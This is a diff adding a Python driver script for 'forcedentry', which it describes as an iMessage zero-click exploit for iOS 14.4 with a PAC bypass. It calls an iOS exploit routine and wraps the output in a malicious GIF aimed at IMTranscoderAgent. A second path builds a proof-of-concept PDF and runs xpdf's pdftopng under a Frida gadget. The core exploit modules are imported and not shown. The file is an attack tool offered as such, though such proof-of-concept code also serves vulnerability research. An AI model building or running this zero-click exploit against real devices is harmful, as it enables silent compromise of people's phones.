@@ -1,0 +1,56 @@
+#!/usr/bin/env python3
+import argparse, os, sys
+
+#from libs import constants, segments
+sys.path.append(os.path.abspath(os.path.join('libs')))
+import frida_utils, ios, pdf, xpdf
+from constants import *
+from segments import *
+
+
+
+def main():
+	parser = argparse.ArgumentParser(
+		prog = 'forcedentry',
+		#iPhone 6s doesn't have PAC, but the exploit uses a PAC bypass for iOS <= 14.4 anyway
+		description = 'iMessage 0 click for iOS 14.4 (tested on iPhone 6s)', 
+	)
+	parser.add_argument('--xpdf', action='store_true') 
+	parser.add_argument('--trace', action='store_true') 
+	parser.add_argument('--imt', action='store_true') 
+	# when doing ssh fowarding, connect to localhost
+	parser.add_argument('--frida-host', action='store', default="127.0.0.1") 
+	args = parser.parse_args()
+
+	# the following command to ssh into the running docker container and 
+	# port forward frida to your host
+	# docker exec -it `docker ps | grep forcedentry | cut -d' ' -f1` bash
+	# ssh -4 -L 27042:127.0.0.1:27042 root@192.168.1.250
+
+	if args.trace:
+		frida_utils.trace(args.frida_host)
+	elif args.imt:
+		frida_utils.imt(args.frida_host)
+	elif args.xpdf:
+		# experimentation run
+		xpdf.frida_experimentation()
+		# build the poc pdf and clean up
+		print("[+] wrote poc.sym and poc.0000 files, creating pdf")
+		os.system("./agl/pdf.py poc > poc.pdf && rm poc.sym && rm poc.0000")
+		print("[+] pdf generated, running with frida script...")
+		print("~~~~~~~ Python debugging ended!! ~~~~~~~")
+		sys.stdout.flush()
+		os.system("LD_PRELOAD=./frida/frida-gadget-16.0.8-linux-x86_64.so xpdf/build/xpdf/pdftopng poc.pdf trash/")
+	else: 
+		# iOS exploit
+		ios.exploit()
+		print("[+] wrote poc.sym and poc.0000 files, creating gif")
+		
+		# regular PDF payload, use this to crash UserNotificationsUIThumbnailProvider
+		# os.system("./exploit-support/pdf.py poc > poc.gif")# && rm poc.sym && rm poc.0000")
+		
+		# IMTranscoderAgent payload
+		pdf.wrap_payload_compressed("calc.gif", "poc.sym", "poc.0000")
+
+if __name__ == "__main__":
+	main()
